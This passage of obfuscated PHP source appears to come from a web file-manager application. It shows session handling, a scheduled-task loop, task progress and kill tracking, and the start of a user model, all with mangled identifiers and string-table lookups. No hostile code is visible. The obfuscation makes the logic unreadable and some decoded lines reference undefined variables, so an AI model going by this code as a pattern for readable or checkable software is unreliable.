isset($½İ»àüÁ[$Š­Ğ„‡²[537]][$Š­Ğ„‡²[1250]])) { $½İ»àüÁ[$Š­Ğ„‡²[537]][$Š­Ğ„‡²[1250]] = $¿µŸµäÌ[$½İ»àüÁ[$Š­Ğ„‡²[537]][$Š­Ğ„‡²[1250]]]; $½İ»àüÁ[$Š­Ğ„‡²[537]][$Š­Ğ„‡²[1251]] = $¿µŸµäÌ[$½İ»àüÁ[$Š­Ğ„‡²[537]][$Š­Ğ„‡²[1251]]]; } if ($½İ»àüÁ[$Š­Ğ„‡²[33]] == $Š­Ğ„‡²[2229] && isset($½İ»àüÁ[$Š­Ğ„‡²[537]][$Š­Ğ„‡²[193]])) { $½İ»àüÁ[$Š­Ğ„‡²[537]][$Š­Ğ„‡²[193]] = $¿µŸµäÌ[$½İ»àüÁ[$Š­Ğ„‡²[537]][$Š­Ğ„‡²[193]]]; } $½İ»àüÁ[$Š­Ğ„‡²[90]] = $¿µŸµäÌ[$½İ»àüÁ[$Š­Ğ„‡²[193]]]; $½İ»àüÁ[$Š­Ğ„‡²[2234]] = $¿µŸµäÌ[$½İ»àüÁ[$Š­Ğ„‡²[2218]]]; if ($½İ»àüÁ[$Š­Ğ„‡²[33]] == $Š­Ğ„‡²[1952]) { $½İ»àüÁ[$Š­Ğ„‡²[2234]] = $½İ»àüÁ[$Š­Ğ„‡²[90]]; $½İ»àüÁ[$Š­Ğ„‡²[2218]] = $½İ»àüÁ[$Š­Ğ„‡²[2234]][$Š­Ğ„‡²[193]]; $½İ»àüÁ[$Š­Ğ„‡²[90]] = !1; $½İ»àüÁ[$Š­Ğ„‡²[193]] = $Š­Ğ„‡²[12]; } $½İ»àüÁ[$Š­Ğ„‡²[2161]] = $çĞå™˜¤[$½İ»àüÁ[$Š­Ğ„‡²[1783]]]; } unset($½İ»àüÁ); $æ×‚“Íï[$Š­Ğ„‡²[456]] = $È¸Ë¯¤¬; return $æ×‚“Íï; } public function removeBySource($ë©±ªÂ­) { $ş„èÚü¡ = array($_SERVER[¼’ç§¼´][502] => $ë©±ªÂ­); $this->where($ş„èÚü¡)->remove(); } } goto Dæ½×Ù¥©‚; A‡‹ÈŸŠô: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ĞîÎÉ =& $_SERVER[¼’ç§¼´]; static $éÚö§—Û = false; if ($éÚö§—Û) { return $éÚö§—Û; } $¦¥Ëœ‰ = $GLOBALS[$ĞîÎÉ[6]][$ĞîÎÉ[426]]; self::$sessionTime = $¦¥Ëœ‰[$ĞîÎÉ[1728]]; $ø€Õ†”ü = isset($GLOBALS[$ĞîÎÉ[1729]]) ? $GLOBALS[$ĞîÎÉ[1729]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ø€Õ†”ü)) { self::$sessionSign = Cookie::get($ø€Õ†”ü); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ø€Õ†”ü, self::$sessionSign, self::$sessionTime); $óÙ¸×§ü = $¦¥Ëœ‰[$ĞîÎÉ[1730]]; $§ïÊÎËÖ = $¦¥Ëœ‰[$óÙ¸×§ü]; $‹®âŒŞ³ = $¦¥Ëœ‰[$ĞîÎÉ[916]]; switch ($óÙ¸×§ü) { case $ĞîÎÉ[21]: self::$handle = Model($ĞîÎÉ[917]); break; case $ĞîÎÉ[918]: self::$handle = new CacheRedis($§ïÊÎËÖ, $‹®âŒŞ³); break; case $ĞîÎÉ[919]: self::$handle = new CacheMemcached($§ïÊÎËÖ, $‹®âŒŞ³); break; case $ĞîÎÉ[232]: $§ïÊÎËÖ[$ĞîÎÉ[87]] = $§ïÊÎËÖ[$ĞîÎÉ[87]] . $ĞîÎÉ[1731]; self::$handle = new CacheFile($§ïÊÎËÖ, $‹®âŒŞ³); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $éÚö§—Û = new self(); return $éÚö§—Û; } public static function getBySign($ƒÉ¿œè±) { $ö‰—Çı = self::$handle->get($ƒÉ¿œè±); $ö‰—Çı = unserialize($ö‰—Çı); return is_array($ö‰—Çı) ? $ö‰—Çı : array(); } public static function setBySign($½¦şÎ¶Á, $éñåƒ¾Ú) { CacheLock::lock($½¦şÎ¶Á); self::$handle->set($½¦şÎ¶Á, serialize($éñåƒ¾Ú), self::$sessionTime); CacheLock::unlock($½¦şÎ¶Á); } public static function sign($óøŒ§é£ = false) { if ($óøŒ§é£) { self::$sessionSign = $óøŒ§é£; } self::init(); return self::$sessionSign; } public static function set($‡Ü«µ°, $úß¸Òñ¸ = false) { self::init(); if (is_array($‡Ü«µ°)) { foreach ($‡Ü«µ° as $ë‹ãëİÅ => $€‡è˜Š›) { array_set_value(self::$data, $ë‹ãëİÅ, $€‡è˜Š›); } } else { array_set_value(self::$data, $‡Ü«µ°, $úß¸Òñ¸); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ÇõŸ÷æ× = false) { self::init(); if (!$ÇõŸ÷æ×) { return self::$data; } return array_get_value(self::$data, $ÇõŸ÷æ×); } public static function remove($·Áøàšó) { self::init(); unset(self::$data[$·Áøàšó]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¼’ç§¼´][922])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ÂÅ©°·æ =& $_SERVER[¼’ç§¼´]; if (self::valueGet($ÂÅ©°·æ[838]) != $ÂÅ©°·æ[91]) { return; } if (self::valueGet($ÂÅ©°·æ[1732]) == $ÂÅ©°·æ[91]) { $Å·™ûÌÚ = self::valueGet($ÂÅ©°·æ[1733]); if (time() - $Å·™ûÌÚ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ÂÅ©°·æ[1732], $ÂÅ©°·æ[91]); self::log($ÂÅ©°·æ[1734] . ACTION . $ÂÅ©°·æ[1735]); Hook::bind($ÂÅ©°·æ[1736], $ÂÅ©°·æ[1737]); $Øß»Ø–¶ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ÂÅ©°·æ[838]) != $ÂÅ©°·æ[91]) { self::valueSet($ÂÅ©°·æ[1732], $ÂÅ©°·æ[230]); self::log($ÂÅ©°·æ[1738]); die; } $”Ì±¦› = time(); if ($”Ì±¦› - $Øß»Ø–¶ >= 60) { self::valueSet(array($ÂÅ©°·æ[1732] => $ÂÅ©°·æ[91], $ÂÅ©°·æ[1733] => $”Ì±¦›)); $Øß»Ø–¶ = $”Ì±¦›; } if (!file_exists(USER_SYSTEM . $ÂÅ©°·æ[1739])) { self::valueSet(array($ÂÅ©°·æ[1732] => $ÂÅ©°·æ[230], $ÂÅ©°·æ[838] => $ÂÅ©°·æ[230])); self::log($ÂÅ©°·æ[1740]); die; } $•³é­µ˜ = file_get_contents(BASIC_PATH . $ÂÅ©°·æ[1741]); $´õèãŞ¯ = KOD_VERSION . $ÂÅ©°·æ[10] . KOD_VERSION_BUILD; $Ğ¿õ¼ş = match_text($•³é­µ˜, $ÂÅ©°·æ[1742]) . $ÂÅ©°·æ[10] . match_text($•³é­µ˜, $ÂÅ©°·æ[1743]); if ($Ğ¿õ¼ş != $´õèãŞ¯) { self::restart(); self::log("\x73\164\x6f\160\145\144\x2e\x5b\166\x65\x72\163\151\157\x6e\40\x75\160\144\x61\164\145\73{$versionNow}\x20\75\76\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $Îúö¦› =& $_SERVER[¼’ç§¼´]; http_close(); $GLOBALS[$Îúö¦›[1744]] = 1; $_SERVER[$Îúö¦›[1745]] = $Îúö¦›[1746]; $_COOKIE = array(); $GLOBALS[$Îúö¦›[1747]] = 1; $GLOBALS[$Îúö¦›[1748]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $‰·¿»è© =& $_SERVER[¼’ç§¼´]; http_close(); self::valueSet($‰·¿»è©[838], $‰·¿»è©[230]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($‰·¿»è©[1732] => $‰·¿»è©[230], $‰·¿»è©[838] => $‰·¿»è©[91])); self::log($‰·¿»è©[1749]); } public static function taskSwitch() { $âÍÃ†ê¢ =& $_SERVER[¼’ç§¼´]; $¶ÖÉŒ» = self::valueGet($âÍÃ†ê¢[838]) == $âÍÃ†ê¢[91] ? $âÍÃ†ê¢[230] : $âÍÃ†ê¢[91]; self::valueSet($âÍÃ†ê¢[838], $¶ÖÉŒ»); } public static function shutdownEvent() { $Ù‰ëû÷· =& $_SERVER[¼’ç§¼´]; self::valueSet($Ù‰ëû÷·[1732], $Ù‰ëû÷·[230]); self::log($Ù‰ëû÷·[1750]); } public static function config($©»¶§®, $…ßòğÎµ) { self::valueSet($_SERVER[¼’ç§¼´][838], $©»¶§®); } private static function taskRunAll() { $åÛÈËÊâ =& $_SERVER[¼’ç§¼´]; $µÂˆ¥¬ = timeFloat(); $î¡¶è¶œ = Model($åÛÈËÊâ[1751])->listData(); $“Òù”‡Ñ = count($î¡¶è¶œ); for ($è·£·ï = 0; $è·£·ï < $“Òù”‡Ñ; $è·£·ï++) { $ƒœÛ„™ë = $î¡¶è¶œ[$è·£·ï]; if (!$ƒœÛ„™ë[$åÛÈËÊâ[486]] || $ƒœÛ„™ë[$åÛÈËÊâ[1752]] != $åÛÈËÊâ[91]) { continue; } if (!self::taskTimeCheck($ƒœÛ„™ë)) { continue; } self::taskRun($ƒœÛ„™ë); } Hook::trigger($åÛÈËÊâ[1753]); self::taskQueueRun($µÂˆ¥¬); } private static function taskQueueRun($®Ş€¸×») { $Ş“Îí‰• = 10; while (!0) { $À¸Û©•› = TaskQueue::run(); if ($À¸Û©•› === !1) { break; } if (timeFloat() - $®Ş€¸×» >= $Ş“Îí‰•) { break; } } } private static function taskTimeCheck($ãÃ‡²) { $æˆŸ¤óü =& $_SERVER[¼’ç§¼´]; $¥Ä°ƒæé = json_decode($ãÃ‡²[$æˆŸ¤óü[206]], !0); $É§›ÂÑ› = intval($ãÃ‡²[$æˆŸ¤óü[1733]]); $ü……Âä = strtotime($æˆŸ¤óü[1754] . $¥Ä°ƒæé[$æˆŸ¤óü[1755]] . $æˆŸ¤óü[1756]) - strtotime($æˆŸ¤óü[1757]); $òâÃãğ = time() - strtotime(date($æˆŸ¤óü[1758]) . $æˆŸ¤óü[1759]); $Ù™Ì³ô = $òâÃãğ >= $ü……Âä && $òâÃãğ <= $ü……Âä + 3600; switch ($¥Ä°ƒæé[$æˆŸ¤óü[33]]) { case $æˆŸ¤óü[1760]: if (time() - $É§›ÂÑ› < 3600 * 24 * 30) { return !1; } if ($¥Ä°ƒæé[$æˆŸ¤óü[1760]] == date($æˆŸ¤óü[1761]) && $Ù™Ì³ô) { return !0; } break; case $æˆŸ¤óü[1762]: if (time() - $É§›ÂÑ› < 3600 * 24 * 7) { return !1; } $°ŒùÒ„µ = date($æˆŸ¤óü[1763]) == 0 ? 7 : date($æˆŸ¤óü[1763]); if ($¥Ä°ƒæé[$æˆŸ¤óü[1762]] == $°ŒùÒ„µ && $Ù™Ì³ô) { return !0; } break; case $æˆŸ¤óü[1755]: if (time() - $É§›ÂÑ› < 3600 * 24) { return !1; } if ($Ù™Ì³ô) { return !0; } break; case $æˆŸ¤óü[1764]: if (time() - $É§›ÂÑ› >= floatval($¥Ä°ƒæé[$æˆŸ¤óü[1764]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Å±Î×Âï =& $_SERVER[¼’ç§¼´]; static $ÕĞÀÉ = 0; $á¦¾¿‘û = 300; if (!$ÕĞÀÉ) { $ÕĞÀÉ = time(); } if (time() - $ÕĞÀÉ < $á¦¾¿‘û) { return; } $ÕĞÀÉ = time(); $øÏ¤š = Model($Å±Î×Âï[588])->db($Å±Î×Âï[12]); if ($øÏ¤š) { $øÏ¤š->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Å±Î×Âï[1765], $Å±Î×Âï[1766]); die; } } public static function taskRun($–ºÓŞ¿Ü) { $¯¤Úƒà‚ =& $_SERVER[¼’ç§¼´]; self::log($¯¤Úƒà‚[1767] . $–ºÓŞ¿Ü[$¯¤Úƒà‚[486]] . $¯¤Úƒà‚[1768] . $–ºÓŞ¿Ü[$¯¤Úƒà‚[32]] . $¯¤Úƒà‚[1769] . $–ºÓŞ¿Ü[$¯¤Úƒà‚[1770]]); Model($¯¤Úƒà‚[1751])->run($–ºÓŞ¿Ü[$¯¤Úƒà‚[486]]); $º“ğíˆ‚ = timeFloat(); $”È»Õ“Œ = $¯¤Úƒà‚[12]; switch ($–ºÓŞ¿Ü[$¯¤Úƒà‚[33]]) { case $¯¤Úƒà‚[384]: $ë°ÚË‚ß = url_request($–ºÓŞ¿Ü[$¯¤Úƒà‚[1770]], $¯¤Úƒà‚[1505], !1, !1, !1, !1, 10); if ($ë°ÚË‚ß[$¯¤Úƒà‚[838]]) { $”È»Õ“Œ = strlen($ë°ÚË‚ß[$¯¤Úƒà‚[1296]]); } break; case $¯¤Úƒà‚[1771]: $”È»Õ“Œ = Hook::apply($–ºÓŞ¿Ü[$¯¤Úƒà‚[1770]]); default: break; } Model($¯¤Úƒà‚[1772])->add(array($¯¤Úƒà‚[1773] => $¯¤Úƒà‚[12], $¯¤Úƒà‚[1774] => $¯¤Úƒà‚[230], $¯¤Úƒà‚[33] => $¯¤Úƒà‚[1775] . $–ºÓŞ¿Ü[$¯¤Úƒà‚[486]], $¯¤Úƒà‚[1776] => json_encode(array($¯¤Úƒà‚[32] => $–ºÓŞ¿Ü[$¯¤Úƒà‚[32]], $¯¤Úƒà‚[1777] => timeFloat() - $º“ğíˆ‚, $¯¤Úƒà‚[370] => $”È»Õ“Œ)))); $ùõæø”û = $”È»Õ“Œ ? $¯¤Úƒà‚[1778] . $”È»Õ“Œ : $¯¤Úƒà‚[12]; self::log($¯¤Úƒà‚[1779] . $–ºÓŞ¿Ü[$¯¤Úƒà‚[486]] . $¯¤Úƒà‚[178] . $ùõæø”û); return !0; } public static function valueGet($£±“¦µ) { $Ç”âÔÙ =& $_SERVER[¼’ç§¼´]; $÷…»Ï° = $Ç”âÔÙ[1780]; $ÀÍóä×Ô = Model($Ç”âÔÙ[519])->get($£±“¦µ, $÷…»Ï°); if (is_null($ÀÍóä×Ô)) { Model($Ç”âÔÙ[519])->set($Ç”âÔÙ[838], $Ç”âÔÙ[91], $÷…»Ï°); Model($Ç”âÔÙ[519])->set($Ç”âÔÙ[1732], $Ç”âÔÙ[230], $÷…»Ï°); $ÀÍóä×Ô = Model($Ç”âÔÙ[519])->get($£±“¦µ, $÷…»Ï°); } return $ÀÍóä×Ô; } private static function valueSet($¨ô¡¼‘Æ, $…¯£ã• = false) { $ö·Ê®’Ó =& $_SERVER[¼’ç§¼´]; $é«Æ£®¨ = $ö·Ê®’Ó[1781]; CacheLock::lock($é«Æ£®¨); $óæ¦ÃÍğ = Model($ö·Ê®’Ó[519])->set($¨ô¡¼‘Æ, $…¯£ã•, $ö·Ê®’Ó[1780]); CacheLock::unlock($é«Æ£®¨); return $óæ¦ÃÍğ; } protected static function log($ÍÚ´¼æÉ) { write_log($ÍÚ´¼æÉ, $_SERVER[¼’ç§¼´][1766]); } private static function cacheClear() { $’§îÇâ˜ =& $_SERVER[¼’ç§¼´]; Cache::clearMemory(Model($’§îÇâ˜[519])->cacheKey($’§îÇâ˜[1780])); Cache::clearMemory(Model($’§îÇâ˜[519])->cacheKey($’§îÇâ˜[1782])); Model($’§îÇâ˜[1751])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\157\160"; const STATYS_RUNNING = "\x72\x75\x6e\156\x69\x6e\x67"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($¼òäÙÀ, $Ğúïèï¨ = '', $ÉÔå¢Ô = 0, $”ˆºåÂß = '') { $œ×õÅ‡Ó =& $_SERVER[¼’ç§¼´]; if (self::get($¼òäÙÀ)) { return; } $this->task = array($œ×õÅ‡Ó[486] => $¼òäÙÀ, $œ×õÅ‡Ó[1783] => USER_ID, $œ×õÅ‡Ó[1671] => $”ˆºåÂß, $œ×õÅ‡Ó[537] => $œ×õÅ‡Ó[12], $œ×õÅ‡Ó[33] => $Ğúïèï¨, $œ×õÅ‡Ó[1151] => $œ×õÅ‡Ó[12], $œ×õÅ‡Ó[1149] => $ÉÔå¢Ô, $œ×õÅ‡Ó[1784] => 0, $œ×õÅ‡Ó[1785] => 0, $œ×õÅ‡Ó[1786] => 0, $œ×õÅ‡Ó[1787] => timeFloat(), $œ×õÅ‡Ó[1788] => 0, $œ×õÅ‡Ó[1789] => 0, $œ×õÅ‡Ó[1790] => 0, $œ×õÅ‡Ó[1791] => 0, $œ×õÅ‡Ó[838] => $œ×õÅ‡Ó[1732]); $GLOBALS[$œ×õÅ‡Ó[1792]] = 1; Hook::bind($œ×õÅ‡Ó[1736], array($this, $œ×õÅ‡Ó[1793])); Hook::bind($œ×õÅ‡Ó[1794], array($this, $œ×õÅ‡Ó[1795])); $this->startAfter(); Hook::trigger($œ×õÅ‡Ó[1796], $this->task); $this->task[$œ×õÅ‡Ó[1789]] = timeFloat(); } public function end($ã˜È²©ù = '') { $É ƒñŒì =& $_SERVER[¼’ç§¼´]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$É ƒñŒì[1789]]) { self::valueSet($this->task[$É ƒñŒì[486]], !1); } $this->isEnd = !0; if ($ã˜È²©ù) { $this->task[$É ƒñŒì[537]] = $ã˜È²©ù; } self::log($É ƒñŒì[1797] . $this->task[$É ƒñŒì[486]] . $É ƒñŒì[1798] . sprintf($É ƒñŒì[940], timeFloat() - $this->task[$É ƒñŒì[1787]]) . $É ƒñŒì[1799]); Hook::unbind($É ƒñŒì[1736], array($this, $É ƒñŒì[1793])); Hook::unbind($É ƒñŒì[1794], array($this, $É ƒñŒì[1795])); $this->endAfter(); $îŸáÑıò = $this->task; $this->task = !1; Hook::trigger($É ƒñŒì[1800], $îŸáÑıò); } public function update($ˆõ®Œä² = 0, $¾ÆÛñ×æ = false) { $¨®ããÀË =& $_SERVER[¼’ç§¼´]; $ÅÉÇû§ =& $this->task; if (!$ÅÉÇû§) { return; } $ÅÉÇû§[$¨®ããÀË[1784]] += $ˆõ®Œä²; $ÅÉÇû§[$¨®ããÀË[1788]] = timeFloat(); if ($ÅÉÇû§[$¨®ããÀË[1149]]) { if ($ÅÉÇû§[$¨®ããÀË[1149]] < $ÅÉÇû§[$¨®ããÀË[1784]]) { $ÅÉÇû§[$¨®ããÀË[1149]] = $ÅÉÇû§[$¨®ããÀË[1784]]; } $Ü·´âŞö = timeFloat() - $ÅÉÇû§[$¨®ããÀË[1787]] - $ÅÉÇû§[$¨®ããÀË[1790]]; if ($Ü·´âŞö <= 0) { $Ü·´âŞö = 0.001; } $ÅÉÇû§[$¨®ããÀË[1785]] = $ÅÉÇû§[$¨®ããÀË[1784]] / $ÅÉÇû§[$¨®ããÀË[1149]]; $ÅÉÇû§[$¨®ããÀË[1786]] = $ÅÉÇû§[$¨®ããÀË[1784]] / $Ü·´âŞö; if ($ÅÉÇû§[$¨®ããÀË[1785]] > 0) { $ÅÉÇû§[$¨®ããÀË[1791]] = $Ü·´âŞö * (1 - $ÅÉÇû§[$¨®ããÀË[1785]]) / $ÅÉÇû§[$¨®ããÀË[1785]]; } $ÅÉÇû§[$¨®ããÀË[1791]] = $ÅÉÇû§[$¨®ããÀË[1791]] <= 0 ? 0 : $ÅÉÇû§[$¨®ããÀË[1791]]; } $this->updateAfter(); $ÄÚÃ’‘ = 0.2; if (timeFloat() - $ÅÉÇû§[$¨®ããÀË[1789]] < $ÄÚÃ’‘ && !$¾ÆÛñ×æ) { return; } $ùİåÑú¥ = self::get($ÅÉÇû§[$¨®ããÀË[486]]); $ùöœ…¥Ø = $ùİåÑú¥[$¨®ããÀË[838]]; if ($ùöœ…¥Ø == self::STATYS_KILL) { $©ˆÉ–ÔÏ = array($¨®ããÀË[1801] => LNG($¨®ããÀË[1802]), $¨®ããÀË[1306] => !1); Cache::set($¨®ããÀË[1803] . $this->task[$¨®ããÀË[486]], $©ˆÉ–ÔÏ, 30); $this->onKill(); $this->end(); die; } else { if ($ùöœ…¥Ø == self::STATYS_STOP) { $«¶ÖíÀ = 2; $ùİåÑú¥[$¨®ããÀË[1790]] += $«¶ÖíÀ; self::valueSet($ÅÉÇû§[$¨®ããÀË[486]], $ùİåÑú¥); sleep($«¶ÖíÀ); $this->update(); return; } } $ÅÉÇû§[$¨®ããÀË[838]] = $ùöœ…¥Ø ? $ùöœ…¥Ø : $ÅÉÇû§[$¨®ããÀË[838]]; $ÅÉÇû§[$¨®ããÀË[1790]] = $ùİåÑú¥[$¨®ããÀË[1790]] ? $ùİåÑú¥[$¨®ããÀË[1790]] : 0; $ÅÉÇû§[$¨®ããÀË[1789]] = timeFloat(); Hook::trigger($¨®ããÀË[1804], $ÅÉÇû§); self::valueSet($ÅÉÇû§[$¨®ããÀË[486]], $ÅÉÇû§); } public function onKillSet($ŠèĞœüş, $Î°Ã‰Øœ = array()) { $this->onKillCall = array($ŠèĞœüş, $Î°Ã‰Øœ); } public function onKill() { $ûÊşüÍ =& $_SERVER[¼’ç§¼´]; self::log($ûÊşüÍ[1797] . $this->task[$ûÊşüÍ[486]] . $ûÊşüÍ[1805]); Hook::trigger($ûÊşüÍ[1806], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ëÆ³Èš£) { $ŸÍÚ¤¯Ø =& $_SERVER[¼’ç§¼´]; Cache::set($ŸÍÚ¤¯Ø[1803] . $this->task[$ŸÍÚ¤¯Ø[486]], $ëÆ³Èš£, 60); if (!is_array($ëÆ³Èš£) || !$ëÆ³Èš£[$ŸÍÚ¤¯Ø[1306]]) { self::log($ŸÍÚ¤¯Ø[1807] . json_encode($ëÆ³Èš£)); } return $ëÆ³Èš£; } public static function get($ÜÒ¯ŠŞ) { $©˜öªÔ” =& $_SERVER[¼’ç§¼´]; $¾Ùıêò¬ = self::valueGet($ÜÒ¯ŠŞ); if (is_array($¾Ùıêò¬) && $¾Ùıêò¬[$©˜öªÔ”[1808]]) { $ í¼«„ß = ActionApply($¾Ùıêò¬[$©˜öªÔ”[1808]], array($¾Ùıêò¬)); $¾Ùıêò¬ = is_array($ í¼«„ß) ? $ í¼«„ß : $¾Ùıêò¬; } return $¾Ùıêò¬; } public static function listData() { $øõäğİ = self::valueGet(); return array_sort_by($øõäğİ, $_SERVER[¼’ç§¼´][1787], !0); } public static function kill($± ¹ıº¿) { return self::changeStatus($± ¹ıº¿, self::STATYS_KILL); } public static function stop($ß ²×ÌÇ) { return self::changeStatus($ß ²×ÌÇ, self::STATYS_STOP); } public static function restart($ùä„üÒá) { return self::changeStatus($ùä„üÒá, self::STATYS_RUNNING); } public static function killAll() { $¢òÃÜåƒ =& $_SERVER[¼’ç§¼´]; $‡µˆØèµ = self::listData(); foreach ($‡µˆØèµ as $ÖÌ£¥©) { self::kill($ÖÌ£¥©[$¢òÃÜåƒ[486]]); } sleep(2); foreach ($‡µˆØèµ as $ÖÌ£¥©) { self::valueSet($ÖÌ£¥©[$¢òÃÜåƒ[486]], !1); } } private static function changeStatus($²ŠÑÖÛ , $¯‚ñÇäı) { $„Æ‡ºÚ¨ =& $_SERVER[¼’ç§¼´]; $°´Œ–Œ… = self::valueGet($²ŠÑÖÛ ); if (!$°´Œ–Œ…) { return !1; } $°´Œ–Œ…[$„Æ‡ºÚ¨[838]] = $¯‚ñÇäı; self::valueSet($²ŠÑÖÛ , $°´Œ–Œ…); self::log($„Æ‡ºÚ¨[1809] . $°´Œ–Œ…[$„Æ‡ºÚ¨[486]] . $„Æ‡ºÚ¨[1810] . $¯‚ñÇäı); return !0; } public static function valueGet($ĞıàÈêÈ = false) { $¯÷ç¶ÏÇ =& $_SERVER[¼’ç§¼´]; if ($ĞıàÈêÈ) { $‡¢Ëêèõ = Model($¯÷ç¶ÏÇ[531])->where(array($¯÷ç¶ÏÇ[97] => $ĞıàÈêÈ, $¯÷ç¶ÏÇ[33] => $¯÷ç¶ÏÇ[1158]))->find(); return $‡¢Ëêèõ ? json_decode($‡¢Ëêèõ[$¯÷ç¶ÏÇ[461]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ƒä˜¶ÊŠ = false) { $¸£›—Í =& $_SERVER[¼’ç§¼´]; $ÔòŠÄ± = array($¸£›—Í[33] => $¸£›—Í[1158]); if ($ƒä˜¶ÊŠ) { $ÔòŠÄ±[$¸£›—Í[1783]] = $ƒä˜¶ÊŠ; } $ÎšŠ”İµ = Model($¸£›—Í[531])->where($ÔòŠÄ±)->select(); $ÎšŠ”İµ = $ÎšŠ”İµ ? $ÎšŠ”İµ : array(); foreach ($ÎšŠ”İµ as $é¼§ÜÈ => $‡ğ®µÎÃ) { $ÎšŠ”İµ[$é¼§ÜÈ] = json_decode($‡ğ®µÎÃ[$¸£›—Í[461]], !0); } return $ÎšŠ”İµ; } public static function valueSet($µ’ÀÌ÷¿, $óµûÕ•Ò) { $·ĞÍ®Ş¯ =& $_SERVER[¼’ç§¼´]; if (!$óµûÕ•Ò) { return Model($·ĞÍ®Ş¯[531])->where(array($·ĞÍ®Ş¯[97] => $µ’ÀÌ÷¿, $·ĞÍ®Ş¯[33] => $·ĞÍ®Ş¯[1158]))->delete(); } $˜ïÀ° = json_encode($óµûÕ•Ò); if (!$˜ïÀ°) { ob_start(); var_dump($óµûÕ•Ò); $ã¢‹½æ” = ob_get_clean(); self::log($·ĞÍ®Ş¯[1811] . json_encode_force($ã¢‹½æ”)); } if (!$µ’ÀÌ÷¿ || !$óµûÕ•Ò[$·ĞÍ®Ş¯[486]]) { return !1; } $•®âöá = array($·ĞÍ®Ş¯[33] => $·ĞÍ®Ş¯[1158], $·ĞÍ®Ş¯[1783] => USER_ID, $·ĞÍ®Ş¯[97] => $µ’ÀÌ÷¿, $·ĞÍ®Ş¯[461] => $˜ïÀ°); $„ÏºıÛ = $·ĞÍ®Ş¯[1812]; CacheLock::lock($„ÏºıÛ); Model($·ĞÍ®Ş¯[531])->add($•®âöá, array(), !0); CacheLock::unlock($„ÏºıÛ); } public static function log($öšÊÈ‚‹) { if (!GLOBAL_DEBUG) { return; } write_log($öšÊÈ‚‹, $_SERVER[¼’ç§¼´][1813]); } } goto EÙ•ğ™Ÿ; BİˆÅ‘•ÒÚ: class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\162"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\x61\155\x65" => "\165\x73\x65\162\137\x6d\x65\164\141", "\x6d\x65\x74\141\x46\x69\x65\154\x64" => "\x75\x73\x65\162\x49\104"); protected $simpleField = "\165\163\145\162\111\x44\x2c\156\x69\143\x6b\x4e\141\x6d\145\54\x6e\x61\155\145\x2c\141\x76\x61\x74\x61\x72\x2c\x73\145\170\54\x73\164\141\x74\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($é’Æ“÷–) { $’ˆ¨¢ù =& $_SERVER[¼’ç§¼´]; $¨‡øª¿¢ = $’ˆ¨¢ù[2474]; return array($’ˆ¨¢ù[2066] => array($é’Æ“÷–[0], $¨‡øª¿¢), $’ˆ¨¢ù[2068] => array($é’Æ“÷–[0], $¨‡øª¿¢), $’ˆ¨¢ù[2475] => array($é’Æ“÷–[0], $¨‡øª¿¢)); } protected function getInfo($´İüÑ…º, $ø“—Îß = false) { $ÇµÊ£‰´ = $this->getInfoSimple($´İüÑ…º); if (!is_array($ÇµÊ£‰´)) { return array(); } if ($ø“—Îß) { return $this->_getInfoApply($ÇµÊ£‰´); } return $this->cacheFunctionGet($_SERVER[¼’ç§¼´][2070], $´İüÑ…º); } protected function getInfoFull($Æ­èÓé, $ß¨üÜ‹Ø = false) { $Ô›××Õ˜ = $this->getInfoSimple($Æ­èÓé); if (!is_array($Ô›××Õ˜)) { return array(); } if ($ß¨üÜ‹Ø) { return $this->_getInfoApply($Ô›××Õ˜, !0); } return $this->cacheFunctionGet($_SERVER[¼’ç§¼´][2476], $Æ­èÓé); } private function _getInfoApply($Ù¸¾µûã, $ó‡¦„ªÔ = false) { $°®œ¦óÅ =& $_SERVER[¼’ç§¼´]; if (!$Ù¸¾µûã) { return $Ù¸¾µûã; } $ôÓºâ¾ˆ = md5($°®œ¦óÅ[2477] . $Ù¸¾µûã[$°®œ¦óÅ[975]] . $°®œ¦óÅ[2478] . $Ù¸¾µûã[$°®œ¦óÅ[32]]); $Ù¸¾µûã = $this->_listDataApplyItem($Ù¸¾µûã); $‡µï¼–¦ = Model($°®œ¦óÅ[1430])->metaGet($Ù¸¾µûã[$°®œ¦óÅ[90]][$°®œ¦óÅ[193]]); $Ù¸¾µûã[$°®œ¦óÅ[2479]] = $ôÓºâ¾ˆ; $Ù¸¾µûã[$°®œ¦óÅ[90]][$°®œ¦óÅ[2266]] = 